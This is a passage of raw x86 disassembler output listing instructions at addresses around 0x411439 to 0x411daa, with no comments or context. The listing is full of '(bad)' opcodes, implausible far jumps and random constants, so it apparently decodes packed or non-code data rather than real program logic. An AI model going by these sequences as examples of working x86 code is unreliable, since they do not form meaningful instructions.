  411439:	add    eax,0xbcdf73ff
  41143e:	inc    ebx
  41143f:	loopne 0x4114a5
  411441:	pop    eax
  411442:	push   es
  411443:	(bad)  
  411444:	push   ds
  411445:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411446:	lds    eax,FWORD PTR [ebp+0x2b]
  411449:	or     DWORD PTR [eax],eax
  41144b:	add    bl,dl
  41144d:	les    eax,FWORD PTR [ebx-0x14]
  411450:	rol    DWORD PTR ds:0x81dc0000,cl
  411456:	out    dx,al
  411457:	add    BYTE PTR [ebx+0x5ec70005],ah
  41145d:	sar    esi,1
  41145f:	inc    DWORD PTR [eax]
	...
  411471:	add    BYTE PTR [ebx-0x14ba72fb],dl
  411477:	js     0x411476
  411479:	jne    0x411452
  41147b:	loopne 0x4114a9
  41147d:	add    al,0x93
  41147f:	add    eax,0x9ffac00b
  411484:	jmp    0x374:0x417f782
  41148b:	or     ecx,edi
  41148d:	repz jne 0x4114b8
  411490:	pop    es
  411491:	sub    DWORD PTR [ebx+0x2e443f2b],edi
  411497:	sub    al,0x2
  411499:	add    dl,bh
  41149b:	push   esi
  41149c:	inc    esi
  41149e:	mov    edi,0xfa000277
  4114a3:	sub    eax,DWORD PTR [edi+0x74]
  4114a6:	ss push edx
  4114a8:	in     eax,dx
  4114a9:	int3   
  4114aa:	fsub   st(4),st
  4114ac:	add    ecx,DWORD PTR [ebx]
  4114ae:	cmp    dh,bh
  4114b0:	jmp    0x47c2969c
  4114b5:	(bad)  
  4114b6:	jns    0x4114e8
  4114b8:	cmp    eax,0x22bbb2d
  4114bd:	je     0x4114bb
  4114bf:	mov    ds:0xecccc4ed,al
  4114c4:	add    eax,edi
  4114c6:	dec    DWORD PTR [esi+0x19]
  4114c9:	inc    ecx
  4114ca:	cli    
  4114cb:	sub    al,0x2
  4114cd:	add    BYTE PTR [edx-0x55],bh
  4114d0:	(bad)
  4114d3:	inc    ecx
  4114d4:	sti    
  4114d5:	inc    BYTE PTR [eax]
	...
  4114e7:	add    BYTE PTR [edi-0x46],cl
  4114ea:	inc    edi
  4114eb:	je     0x4114bb
  4114ed:	(bad)  
  4114ee:	sub    eax,0x472dfa02
  4114f3:	je     0x4114b3
  4114f5:	mov    BYTE PTR [ebx+0x0],0xfa
  4114f9:	sub    eax,0x85ba3246
  4114fe:	inc    edi
  4114ff:	(bad)  
  411500:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411501:	call   DWORD PTR [ebp+ebp*4-0x1e]
  411505:	test   DWORD PTR cs:[eax+ebx*8-0x7e01b812],0xa0fd0205
  411511:	adc    BYTE PTR [eax+eiz*8+0x7f],ah
  411515:	inc    eax
  411516:	adc    eax,0xe904fa8b
  41151b:	add    ecx,ebp
  41151d:	fld    TBYTE PTR [edi]
  41151f:	inc    esp
  411520:	into   
  411521:	mov    ecx,DWORD PTR [esp+eax*4]
  411524:	cmp    DWORD PTR [ecx-0x80],eax
  411527:	in     eax,dx
  411528:	pop    ebp
  411529:	(bad)
  41152c:	retf   
  41152d:	add    eax,0x4d347aa
  411532:	shl    DWORD PTR ds:0x5be904fb,1
  411538:	aaa    
  411539:	sti    
  41153a:	int    0x47
  41153c:	adc    eax,0x2447b99a
  411541:	lods   eax,DWORD PTR ds:[esi]
  411542:	pop    ebx
  411543:	push   ss
  411544:	mov    ebx,0xe1314104
  411549:	(bad)
	...
  41155c:	add    BYTE PTR [eax],al
  41155e:	(bad)  
  41155f:	sti    
  411560:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  411561:	inc    edi
  411562:	popf   
  411563:	sub    esi,ecx
  411565:	(bad)  
  411566:	std    
  411567:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411568:	into   
  411569:	adc    eax,0x4681053b
  41156e:	xor    eax,DWORD PTR [eax-0x7b]
  411571:	fcomp  QWORD PTR [edx+0x520427ee]
  411577:	xor    ah,al
  411579:	(bad)  
  41157a:	aad    0x27
  41157c:	jge    0x411588
  41157e:	int    0x3f
  411580:	shl    ah,1
  411582:	adc    al,dh
  411584:	call   0xa82f4e64
  411589:	add    esp,DWORD PTR [edx-0x53b8eddc]
  41158f:	lods   al,BYTE PTR ds:[esi]
  411590:	pop    ebx
  411591:	push   ss
  411592:	cmp    eax,DWORD PTR ds:0xc5d199d1
  411598:	(bad)  
  411599:	call   0x2e7a6acf
  41159e:	xor    eax,0xbed1f9a8
  4115a3:	aas    
  4115a4:	data16 arpl si,bx
  4115a7:	(bad)  
  4115aa:	mov    eax,0xce0efefd
  4115af:	push   es
  4115b0:	cli    
  4115b1:	push   es
  4115b2:	mov    ebp,0xb5033427
  4115b7:	or     ch,BYTE PTR ds:[ecx]
  4115ba:	sub    dl,BYTE PTR [edx]
  4115bc:	call   0xfe7fd6a0
  4115c1:	repnz add BYTE PTR [eax],al
	...
  4115d4:	mov    ecx,0xfaa609b3
  4115d9:	push   ebx
  4115da:	dec    edx
  4115db:	sub    dh,bh
  4115dd:	add    eax,0xacf9e900
  4115e2:	add    al,ch
  4115e4:	stc    
  4115e5:	add    al,0xe8
  4115e7:	(bad)  
  4115e8:	or     DWORD PTR [eax-0x2],eax
  4115eb:	mov    cl,BYTE PTR [edx]
  4115ed:	retf   0xe940
  4115f0:	int3   
  4115f1:	enter  0xe8fb,0xfe
  4115f5:	add    al,0x0
  4115f7:	ins    BYTE PTR es:[edi],dx
  4115f8:	cmp    bh,BYTE PTR [ebx]
  4115fa:	dec    edi
  4115fb:	xchg   esi,eax
  4115fc:	or     bl,BYTE PTR [eax]
  4115fe:	dec    ebx
  4115ff:	sub    dh,dh
  411601:	sub    al,0x68
  411603:	jmp    0x4115fe
  411605:	add    al,0xb
  411607:	test   eax,0xbcff19ca
  41160c:	retf   0x40cb
  41160f:	jmp    0x666f6e45
  411614:	cmp    al,0x47
  411616:	add    al,0xf4
  411618:	add    ch,0xff
  41161b:	call   0x41411b19
  411620:	xchg   edi,eax
  411621:	clc    
  411622:	inc    BYTE PTR [eax]
  411624:	cmp    al,0xda
  411626:	add    al,0x33
  411628:	fadd   st(6),st
  41162a:	push   si
  41162c:	add    al,0x48
  41162e:	(bad)  
  41162f:	out    0xa0,eax
  411631:	sar    ebp,cl
  411633:	dec    edx
  411635:	ret    0x8b53
	...
  411648:	add    BYTE PTR [eax],al
  41164a:	out    dx,eax
  41164b:	pop    ecx
  41164c:	add    eax,0xf802a3e9
  411651:	jb     0x4116b5
  411653:	ret    
  411654:	std    
  411655:	push   0x53
  411657:	fidivr DWORD PTR [eax-0x47fdacff]
  41165d:	add    BYTE PTR [ebx+0x2],ah
  411660:	add    cl,cl
  411662:	and    DWORD PTR [esi],edi
  411664:	(bad)  
  411665:	repnz fnstcw WORD PTR ds:0x5b00
  41166b:	push   ebx
  41166c:	inc    edx
  41166e:	dec    esp
  41166f:	popa   
  411670:	clc    
  411671:	call   0xa4291f59
  411676:	adc    al,BYTE PTR [edx]
  411678:	add    al,ch
  41167a:	pop    ecx
  41167b:	(bad)  
  41167c:	std    
  41167d:	(bad)  
  41167e:	cmp    edi,DWORD PTR [eax+esi*8+0x12e15cff]
  411685:	cmc    
  411686:	pop    esp
  411687:	enter  0xfce6,0x66
  41168b:	enter  0x83fd,0xce
  41168f:	hlt    
  411690:	dec    ecx
  411691:	inc    ecx
  411692:	jecxz  0x411695
  411694:	je     0x4116af
  411696:	push   eax
  411697:	push   es
  411698:	lds    ebp,FWORD PTR [esi]
  41169a:	adc    cl,BYTE PTR [ecx]
  41169c:	add    BYTE PTR [ebp+eiz*8-0x38],dh
  4116a0:	adc    eax,ebp
  4116a2:	lea    eax,[edx-0x2]
  4116a5:	(bad)  
  4116a6:	(bad)  
  4116a7:	or     BYTE PTR [ecx],ch
  4116a9:	inc    ecx
  4116aa:	rol    DWORD PTR [edx],cl
	...
  4116c0:	cli    
  4116c1:	stos   DWORD PTR es:[edi],eax
  4116c2:	pop    ebx
  4116c3:	(bad)  
  4116c4:	mov    cl,0xce
  4116c6:	inc    esp
  4116c7:	out    0xb2,eax
  4116c9:	mov    DWORD PTR [esi+edi*8-0x47],0x3ae8cc53
  4116d1:	sub    al,0x4a
  4116d3:	jno    0x4116d0
  4116d5:	jmp    0x2:0x2cede744
  4116dc:	adc    BYTE PTR [ecx],ch
  4116de:	test   eax,0x531e482a
  4116e3:	xor    BYTE PTR [eax+0x27],0xcd
  4116e7:	add    DWORD PTR [ecx+0x29],edx
  4116ea:	push   edi
  4116eb:	jmp    0x355:0xfe44a652
  4116f2:	ins    BYTE PTR es:[edi],dx
  4116f3:	test   BYTE PTR [ebp+0x2e],0xd8
  4116f7:	call   FWORD PTR [ebp+0x17]
  4116fa:	add    eax,DWORD PTR [eax]
  4116fc:	cli    
  4116fd:	pop    esi
  4116fe:	sbb    eax,0x3ecd360
  411703:	call   edi
  411705:	(bad)  
  411706:	stos   BYTE PTR es:[edi],al
  411707:	inc    eax
  411708:	cli    
  411709:	inc    esi
  41170a:	sbb    eax,0x3ecc368
  41170f:	(bad)  
  411710:	ffreep st(7)
  411712:	stos   BYTE PTR es:[edi],al
  411713:	inc    eax
  411714:	cli    
  411715:	outs   dx,BYTE PTR ds:[esi]
  411716:	sbb    eax,0x3eca370
  41171b:	call   edi
  41171d:	pop    ss
  41171e:	stos   DWORD PTR es:[edi],eax
  41171f:	inc    eax
  411720:	cli    
  411721:	xchg   edx,eax
  411722:	sbb    eax,0x78
	...
  411733:	add    BYTE PTR [eax],al
  411735:	add    BYTE PTR [ebx-0x13],dl
  411738:	add    edi,edi
  41173a:	pop    ds
  41173b:	add    ch,BYTE PTR [ebx+0x1dbafa40]
  411741:	xor    BYTE PTR [ebx],0xed
  411744:	add    edi,edi
  411746:	pop    ss
  411747:	mov    ds:0x4fa40a9,al
  41174c:	pushw  ds
  41174e:	jb     0x41172e
  411750:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411751:	add    esi,DWORD PTR [ebp+0x3aaa64e2]
  411757:	add    eax,0xde8a1e4e
  41175c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41175d:	add    ebx,DWORD PTR [ebp+0x3aaa54e2]
  411763:	add    eax,0xde721e36
  411768:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411769:	add    eax,DWORD PTR [ebp+0x3aaa84e2]
  41176f:	add    eax,0xde9a1e1e
  411774:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411775:	add    ebp,DWORD PTR [ebp-0x1e]
  411778:	inc    esp
  411779:	stos   BYTE PTR es:[edi],al
  41177a:	mov    edx,0x921e0604
  41177f:	fisub  WORD PTR [edi+0x44e25503]
  411785:	stos   BYTE PTR es:[edi],al
  411786:	mov    edx,0x8a1dee04
  41178b:	fisub  WORD PTR [edi]
  41178d:	add    al,0x3d
  41178f:	loop   0x411725
  411791:	fnstsw WORD PTR [edx+0x65e9d604]
  411797:	fisub  WORD PTR [edi]
  411799:	add    al,0x0
	...
  4117ab:	add    BYTE PTR ds:0xbadd84e2,ah
  4117b1:	add    al,0xbe
  4117b3:	jmp    0x468f60d
  4117b8:	or     eax,0xbadda4e2
  4117bd:	add    al,0xa6
  4117bf:	jmp    0x468f5f9
  4117c4:	cmc    
  4117c5:	loope  0x41176b
  4117c7:	fnstsw WORD PTR [edx]
  4117c9:	add    eax,0xddb5e98e
  4117ce:	daa    
  4117cf:	add    al,0xdd
  4117d1:	loope  0x411767
  4117d3:	fnstsw WORD PTR [edx]
  4117d5:	add    eax,0x53e37600
  4117da:	pop    eax
  4117db:	sub    dh,bh
  4117dd:	cmp    esp,DWORD PTR [eax*2+0x5dffc49f]
  4117e4:	mov    ds:0xf9a8585b,eax
  4117e9:	cmp    esp,DWORD PTR [eax*2+0x45ffc4c7]
  4117f0:	xchg   ebx,eax
  4117f1:	and    ebx,DWORD PTR [eax-0x58]
  4117f4:	stc    
  4117f5:	cmp    esp,DWORD PTR [eax*2+0x2dffc4af]
  4117fc:	xchg   ebx,eax
  4117fd:	sub    ebx,DWORD PTR [eax-0x58]
  411800:	stc    
  411801:	cmp    esp,DWORD PTR [edx*1+0x15ffc457]
  411808:	arpl   WORD PTR [ebx],si
  41180a:	pop    eax
  41180b:	test   al,0xf9
  41180d:	cmp    esp,DWORD PTR [eax*1+0x0]
	...
  411820:	add    BYTE PTR [eax],al
  411822:	aas    
  411823:	(bad)  
  411824:	(bad)  
  411825:	std    
  411826:	bound  edi,QWORD PTR [ebx]
  411828:	pop    eax
  411829:	test   al,0xf9
  41182b:	cmp    esp,DWORD PTR [eiz*8-0x1a003bd9]
  411832:	push   edx
  411833:	add    ebx,DWORD PTR [edx+0x28]
  411836:	(bad)  
  411837:	cmp    esp,DWORD PTR [eiz*8-0x32003bb1]
  41183e:	adc    cl,BYTE PTR [ebx]
  411840:	pop    edx
  411841:	sub    dh,dh
  411843:	cmp    esp,DWORD PTR [edx*8-0x4a003bc9]
  41184a:	and    dl,BYTE PTR [ebx]
  41184c:	pop    edx
  41184d:	sub    dh,bh
  41184f:	cmp    esp,DWORD PTR [eax*1-0x62003be4]
  411856:	loop   0x411872
  411858:	pop    edx
  411859:	sub    dh,dh
  41185b:	cmp    DWORD PTR [eax*8-0x3a39],esp
  411862:	je     0x411891
  411864:	es pop edx
  411866:	and    al,BYTE PTR [ecx]
  411868:	jmp    DWORD PTR ds:0x3f58b7
  41186e:	push   esp
  41186f:	sub    eax,0x6925a32
  411874:	jmp    DWORD PTR ds:0x3f5adb
  41187a:	inc    esp
  41187b:	sub    eax,0x6525a3a
  411880:	jmp    DWORD PTR ds:0x3f5853
	...
  411896:	add    BYTE PTR [eax],al
  411898:	aam    0x2c
  41189a:	inc    edx
  41189b:	pop    edx
  41189c:	bound  eax,QWORD PTR [esi]
  41189e:	jmp    DWORD PTR ds:0x3f585b
  4118a4:	aam    0x2c
  4118a6:	dec    esi
  4118a7:	pop    edx
  4118a8:	mov    ds:0xab25ff06,al
  4118ad:	pop    eax
  4118ae:	aas    
  4118af:	add    ah,dh
  4118b1:	sub    al,0x5a
  4118b3:	pop    edx
  4118b4:	xchg   edx,eax
  4118b5:	push   es
  4118b6:	jmp    DWORD PTR ds:0x3f5883
  4118bc:	inc    esp
  4118bd:	and    ah,BYTE PTR [edx+0x5a]
  4118c0:	xchg   edx,eax
  4118c1:	push   es
  4118c2:	jmp    DWORD PTR ds:0x3f5aab
  4118c8:	push   esp
  4118c9:	and    ch,BYTE PTR [edx+0x5a]
  4118cc:	loop   0x4118ce
  4118ce:	jmp    DWORD PTR ds:0x3f5ac3
  4118d4:	xor    al,0x22
  4118d6:	jb     0x411932
  4118d8:	loop   0x4118da
  4118da:	jmp    DWORD PTR ds:0x3f5acb
  4118e0:	push   esp
  4118e1:	and    bh,BYTE PTR [edx+0x5a]
  4118e4:	rol    BYTE PTR [eax],cl
  4118e6:	jmp    DWORD PTR ds:0x3f5b5f
  4118ec:	cli    
  4118ed:	xchg   edx,eax
  4118ee:	out    0x8b,al
  4118f0:	inc    eax
  4118f1:	in     eax,dx
  4118f2:	add    edi,edi
  4118f4:	pop    ss
  4118f5:	(bad)  
  4118f7:	inc    eax
  4118f8:	cli    
  4118f9:	mov    edx,0x97e6
	...
  41190e:	xor    ch,ch
  411910:	add    edi,edi
  411912:	pop    ds
  411913:	enter  0x40dd,0xfa
  411917:	mov    ds:0x6d509fe6,al
  41191c:	add    bh,bh
  41191e:	xlat   BYTE PTR ds:[ebx]
  41191f:	xchg   ebp,ebx
  411921:	inc    eax
  411922:	cli    
  411923:	retf   0xa7e6
  411926:	inc    eax
  411927:	ins    DWORD PTR es:[edi],dx
  411928:	add    bh,bh
  41192a:	fild   WORD PTR [edi-0xd05bf23]
  411930:	out    0xb3,al
  411932:	and    BYTE PTR [ebp+0x2],ch
  411935:	call   edi
  411937:	mov    ds:0x1afa40dd,eax
  41193c:	out    0xbb,eax
  41193e:	shr    BYTE PTR [edx+eax*1-0x1],1
  411942:	pop    ds
  411943:	in     al,dx
  411944:	fld    QWORD PTR [eax-0x6]
  411947:	add    ah,bh
  411949:	ret    
  41194a:	mov    al,0x6c
  41194c:	add    bh,bh
  41194e:	pop    ss
  41194f:	in     al,0xdd
  411951:	inc    eax
  411952:	cli    
  411953:	sub    ah,ch
  411955:	retf   
  411956:	mov    al,ds:0xdfff03ec
  41195b:	jnp    0x411939
  41195d:	inc    eax
  41195e:	cli    
  41195f:	push   edx
  411960:	in     eax,0xd3
  411962:	shr    ah,0x3
  411965:	call   edi
  411967:	arpl   sp,bx
  411969:	inc    eax
  41196a:	cli    
  41196b:	jp     0x411952
  41196d:	fbstp  TBYTE PTR [eax+0xff03ec]
	...
  411983:	add    bh,bl
  411985:	aas    
  411986:	fadd   QWORD PTR [eax-0x6]
  411989:	add    al,0xb5
  41198b:	dec    edi
  41198c:	ror    DWORD PTR [ecx-0x54],0x4f
  411990:	ror    DWORD PTR [ecx+0x61],0xc7
  411994:	sbb    DWORD PTR [ecx],eax
  411996:	push   0x3b
  411998:	sti    
  411999:	mov    ecx,0x5597bf0
  41199e:	jmp    0xe942d1a6
  4119a3:	test   ch,cl
  4119a5:	add    esp,ebp
  4119a7:	or     eax,DWORD PTR [edx-0x5fc16fd]
  4119ad:	inc    edx
  4119ae:	in     al,0x3
  4119b0:	jns    0x4119ef
  4119b2:	loopne 0x411972
  4119b4:	std    
  4119b5:	jl     0x41199b
  4119b7:	add    edi,edx
  4119b9:	add    al,0x2b
  4119bb:	pop    es
  4119bc:	cli    
  4119bd:	add    DWORD PTR [eax+0x13],0xf
  4119c1:	or     eax,0x4fa0971
  4119c6:	jmp    0x6a461310
  4119cb:	cmp    edx,DWORD PTR ds:0xf57bf0ba
  4119d1:	add    al,0xe9
  4119d3:	add    edi,DWORD PTR [eax]
  4119d5:	add    ecx,ebp
  4119d7:	test   BYTE PTR [ebp-0x3b],ah
  4119da:	or     DWORD PTR [ebx],0xffffff92
  4119dd:	or     ebp,ecx
  4119df:	add    edi,edx
  4119e1:	inc    edx
  4119e2:	in     al,dx
  4119e3:	add    eax,DWORD PTR [edi]
  4119e5:	test   eax,ebp
  4119e7:	add    eax,DWORD PTR [eax]
	...
  4119f9:	add    dl,bh
  4119fb:	mov    ecx,0x5017bf0
  411a00:	jmp    0xe9425208
  411a05:	add    dl,bh
  411a07:	add    eax,0xc9f03e9
  411a0c:	or     DWORD PTR [esi],0x41e904fa
  411a12:	stc    
  411a13:	add    al,0x0
  411a15:	hlt    
  411a16:	stc    
  411a17:	add    al,BYTE PTR [eax]
  411a19:	jmp    0xf9f91a58
  411a1e:	stc    
  411a1f:	add    al,0x0
  411a21:	stos   DWORD PTR es:[edi],eax
  411a22:	add    al,BYTE PTR ds:0x4fde93d
  411a28:	add    BYTE PTR [esi+ebp*8],cl
  411a2b:	jl     0x411a3e
  411a2d:	jmp    0xe6031f2b
  411a32:	stc    
  411a33:	stc    
  411a34:	jmp    eax
  411a36:	stc    
  411a37:	add    al,0x7d
  411a39:	loope  0x411a7c
  411a3b:	adc    al,0x0
  411a3d:	jmp    0xe9445d3b
  411a42:	cli    
  411a43:	add    al,0x10
  411a45:	jmp    0x9148d443
  411a4a:	add    al,0x5
  411a4c:	add    cl,ch
  411a4e:	cmp    eax,DWORD PTR [eax+eax*1]
  411a51:	cld    
  411a52:	stc    
  411a53:	in     al,0xff
  411a55:	call   0xd1f91a14
  411a5a:	stc    
  411a5b:	add    al,0x0
  411a5d:	sub    eax,DWORD PTR [eax]
	...
  411a6f:	add    BYTE PTR [edx],al
  411a71:	add    eax,0x3739e93d
  411a76:	(bad)  
  411a77:	xchg   esp,eax
  411a78:	icebp  
  411a79:	jl     0x411a94
  411a7b:	jmp    0xee031f79
  411a80:	stc    
  411a81:	stc    
  411a82:	jmp    FWORD PTR [eax-0xa]
  411a85:	add    al,0x7d
  411a87:	loope  0x411a4a
  411a89:	sbb    eax,DWORD PTR [eax]
  411a8b:	jmp    0xe9445d89
  411a90:	sub    BYTE PTR [esp+edi*1-0x17],cl
  411a94:	stc    
  411a95:	add    eax,0x445ae600
  411a9a:	mov    WORD PTR ds:0x8b16ef,ds
  411aa0:	(bad)  
  411aa1:	lds    eax,FWORD PTR [edx]
  411aa3:	add    BYTE PTR [eax+0x13041a80],ah
  411aa9:	add    edi,edi
  411aab:	jne    0x411adb
  411aad:	mov    bh,BYTE PTR [edi+0x10]
  411ab0:	out    0x2,eax
  411ab2:	add    BYTE PTR [ecx+0x41a62],cl
  411ab8:	rol    DWORD PTR [edx-0x3b],cl
  411abb:	or     edi,0xcbfffffe
  411ac1:	add    al,BYTE PTR [eax]
  411ac3:	add    BYTE PTR [edx-0x7f],cl
  411ac6:	push   cs
  411ac7:	add    al,0xd3
  411ac9:	add    al,BYTE PTR [ebx-0x14884]
  411acf:	mov    ch,BYTE PTR [edx]
  411ad1:	sbb    al,BYTE PTR [eax+eax*1]
	...
  411ae4:	add    BYTE PTR [eax],al
  411ae6:	mov    ds:0x928a096e,eax
  411aeb:	add    al,0xc0
  411aed:	(bad)  
  411aee:	ror    DWORD PTR [ecx+0x2a7c1ff],cl
  411af4:	shl    BYTE PTR [ecx],1
  411af6:	loope  0x411af5
  411af8:	inc    DWORD PTR [edx+0x41612]
  411afe:	xchg   ebx,eax
  411aff:	div    DWORD PTR [ebx+0x1d]
  411b02:	call   0x63452987
  411b07:	add    cl,BYTE PTR [ecx-0x1947f]
  411b0d:	call   DWORD PTR [ebx+0x671c7fbf]
  411b13:	add    al,BYTE PTR [eax]
  411b15:	or     BYTE PTR [ebx+0x2],ah
  411b18:	add    BYTE PTR [ecx+0x411d2],cl
  411b1e:	push   ebx
  411b1f:	mov    eax,DWORD PTR [edi+0x22718]
  411b25:	rol    BYTE PTR [edx],1
  411b27:	les    eax,FWORD PTR [ecx+0x62ffa81]
  411b2d:	add    dl,bh
  411b2f:	inc    esi
  411b30:	mov    dh,0x1c
  411b32:	sub    DWORD PTR [ebp+0x2bfa0413],0x27e28089
  411b3c:	add    al,BYTE PTR [eax]
  411b3e:	mov    edx,0xfe1b825e
  411b43:	sub    eax,DWORD PTR [edx]
  411b45:	or     dl,bh
  411b47:	sub    eax,DWORD PTR [edx]
  411b49:	mov    DWORD PTR [eax],eax
	...
  411b5b:	add    BYTE PTR [ebx+0x3b],bh
  411b5e:	push   es
  411b5f:	add    dl,bh
  411b61:	mov    ds:0x2bfe178a,al
  411b66:	add    cl,BYTE PTR [edx-0x2bdd605]
  411b6c:	mov    edx,0x71c302a3
  411b71:	(bad)  
  411b73:	add    eax,DWORD PTR [ecx+0x4703e677]
  411b79:	outs   dx,BYTE PTR ds:[esi]
  411b7a:	shl    DWORD PTR [edx],cl
  411b7c:	lods   al,BYTE PTR ds:[esi]
  411b7d:	mov    al,ds:0xd370ffca
  411b82:	and    dh,0xfb
  411b85:	sbb    al,0x2c
  411b87:	inc    ebp
  411b88:	jg     0x411bd9
  411b8a:	rol    DWORD PTR [edx-0x104cd37e],cl
  411b90:	jns    0x411b87
  411b92:	add    bh,BYTE PTR [ebp-0x1c3218b]
  411b98:	jg     0x411b32
  411b9a:	or     DWORD PTR [eax+ebp*8+0x7a],esi
  411b9e:	xchg   esi,edi
  411ba0:	sti    
  411ba1:	les    ebx,FWORD PTR [edi]
  411ba3:	add    al,0xfa
  411ba5:	sub    esi,DWORD PTR [ebp+0x13ac8118]
  411bab:	add    al,0xfa
  411bad:	sub    ecx,DWORD PTR [ecx+0x21fe280]
  411bb3:	add    BYTE PTR [edx+0x117a7004],bh
  411bb9:	add    ecx,ebp
  411bbb:	add    esi,DWORD PTR [ebx-0x7d]
  411bbe:	clc    
  411bbf:	pop    es
	...
  411bd0:	add    BYTE PTR [eax],al
  411bd2:	cli    
  411bd3:	add    al,0x62
  411bd5:	sub    ch,0x0
  411bd8:	jmp    0xe7831fe0
  411bdd:	mov    bh,0xf3
  411bdf:	mov    dl,al
  411be1:	add    DWORD PTR [ecx],esp
  411be3:	ss test eax,0xea200d8b
  411be9:	push   ebx
  411bea:	or     eax,0xfe1f5006
  411bef:	add    al,0xe9
  411bf1:	mov    dh,0x2
  411bf3:	and    BYTE PTR [edi+0x13],0xfe
  411bf7:	add    al,0xe9
  411bf9:	mov    bh,BYTE PTR [edx+0xd]
  411bfc:	in     eax,0x3
  411bfe:	cli    
  411bff:	les    ebx,FWORD PTR [edi+0x7a]
  411c02:	loope  0x411c0c
  411c04:	jmp    0xf8c79f0c
  411c09:	pop    es
  411c0a:	cli    
  411c0b:	add    al,0x72
  411c0d:	or     BYTE PTR ds:0x7003e909,0xd
  411c14:	jmp    0x411c6e
  411c16:	xchg   edi,eax
  411c17:	dec    eax
  411c18:	pop    ss
  411c19:	sub    DWORD PTR [eax+0x23],edi
  411c1c:	out    0x8b,eax
  411c1e:	in     eax,dx
  411c1f:	mov    ecx,0x5dfad85a
  411c24:	int3   
  411c25:	pop    es
  411c26:	cli    
  411c27:	add    al,0x9c
  411c29:	sbb    al,BYTE PTR [ecx-0x5f8077a]
  411c2f:	add    al,0x60
  411c31:	add    BYTE PTR ds:0x3e909,0x0
	...
  411c48:	mov    edx,0xf61f3f7d
  411c4d:	add    al,0xe9
  411c4f:	mov    bh,BYTE PTR [edx+0x15]
  411c52:	add    ch,ch
  411c54:	stc    
  411c55:	add    al,0x8b
  411c57:	push   0xe9000911
  411c5c:	jmp    0x411ca3
  411c5e:	add    BYTE PTR [ebp-0xc],dl
  411c61:	jle    0x411c72
  411c63:	jmp    0x411c2c
  411c65:	xor    ecx,eax
  411c67:	popa   
  411c68:	out    dx,al
  411c69:	pop    ds
  411c6a:	add    DWORD PTR [ecx-0x2256faea],ebx
  411c70:	add    eax,0xdf3cfe34
  411c75:	jg     0x411bf7
  411c77:	fprem1 
  411c79:	xor    edi,esi
  411c7b:	jo     0x411cf4
  411c7d:	sbb    eax,DWORD PTR [ecx+ebp*8]
  411c80:	stc    
  411c81:	les    ecx,FWORD PTR [eax+0x90250]
  411c87:	jmp    0xed50a112
  411c8c:	stc    
  411c8d:	add    al,0x8b
  411c8f:	jo     0x411c77
  411c91:	or     BYTE PTR [eax],al
  411c93:	jmp    0xfa001c1
  411c98:	rol    DWORD PTR [ebp+0x3],cl
  411c9b:	jmp    0xcdcbf564
  411ca0:	lds    eax,FWORD PTR [ebx]
  411ca2:	push   esi
  411ca3:	sbb    dh,BYTE PTR [esi]
  411ca5:	fild   DWORD PTR [edx+0x4bb014c]
  411cab:	test   BYTE PTR [eax],al
	...
  411cbd:	add    BYTE PTR [ecx],al
  411cbf:	add    eax,0xaf74e900
  411cc4:	and    ebx,ebp
  411cc6:	ins    BYTE PTR es:[edi],dx
  411cc7:	cmp    ch,BYTE PTR [edx]
  411cc9:	xor    al,0x83
  411ccb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  411ccc:	and    ebp,ecx
  411cce:	jg     0x411ce2
  411cd0:	test   BYTE PTR [edx-0x56],al
  411cd3:	adc    ecx,DWORD PTR [ebx-0x73a692dc]
  411cd9:	jb     0x411cd9
  411cdb:	add    al,0x0
  411cdd:	add    BYTE PTR [ebx+0x31],ah
  411ce0:	sbb    BYTE PTR [ebp+ebx*2+0x40],dh
  411ce4:	inc    eax
  411ce5:	test   DWORD PTR [edx],ebx
  411ce7:	jbe    0x411cdd
  411ce9:	and    ebx,0x7
  411cec:	test   ecx,ecx
  411cee:	into   
  411cef:	add    BYTE PTR [ebx+0x1e211c0],al
  411cf5:	adc    DWORD PTR [ebx+0x6],0x47
  411cf9:	inc    esi
  411cfa:	mov    al,ds:0x221c226b
  411cff:	je     0x411ccd
  411d01:	pop    edi
  411d02:	in     eax,0x4d
  411d04:	pop    ecx
  411d05:	ret    0x717
  411d08:	mov    edx,DWORD PTR [edi+edi*8+0x4]
  411d0c:	push   ebp
  411d0d:	push   esi
  411d0e:	push   0xcb86c5f9
  411d13:	xor    bh,dh
  411d15:	call   ebx
  411d17:	push   es
  411d18:	add    BYTE PTR [eax],al
  411d1a:	pop    ecx
  411d1b:	add    BYTE PTR [ecx+ecx*8+0x12eb2c4],al
	...
  411d32:	add    BYTE PTR [eax],al
  411d34:	rol    DWORD PTR [esi],cl
  411d36:	push   edi
  411d37:	mov    eax,edi
  411d39:	push   edx
  411d3a:	adc    al,BYTE PTR [ebx+0x575ff24]
  411d40:	push   esp
  411d41:	(bad)  
  411d42:	(bad)  
  411d43:	call   DWORD PTR [ebx-0x33d43f7d]
  411d49:	xchg   ebp,eax
  411d4a:	cmp    BYTE PTR [eax],cl
  411d4c:	scas   eax,DWORD PTR es:[edi]
  411d4d:	inc    eax
  411d4e:	dec    ebp
  411d4f:	inc    eax
  411d50:	push   ds
  411d51:	out    dx,eax
  411d52:	jae    0x411d4a
  411d54:	adc    BYTE PTR [edx+ebx*1-0xf96cfc],al
  411d5b:	jne    0x411da3
  411d5d:	add    DWORD PTR [eax+edx*1-0x76fff9a1],0xffffffdd
  411d65:	or     eax,0x1bfa0004
  411d6a:	ret    0x7cc6
  411d6d:	and    dh,bh
  411d6f:	dec    DWORD PTR [ebp+0x34]
  411d72:	add    al,BYTE PTR [eax]
  411d74:	cli    
  411d75:	mov    ah,0x80
  411d77:	psadbw mm3,QWORD PTR [ebx]
  411d7a:	add    cl,BYTE PTR [ebx-0x1ab84]
  411d80:	sub    eax,0x7c8ae36c
  411d85:	sub    al,0xfe
  411d87:	call   FWORD PTR ds:0x825f0da6
  411d8d:	and    al,0x37
  411d8f:	test   edx,ebp
  411d91:	pop    ds
  411d92:	add    al,BYTE PTR [eax]
  411d94:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  411d95:	adc    BYTE PTR [esi+0x7],al
	...
  411da8:	add    BYTE PTR [eax],al
  411daa:	cli    
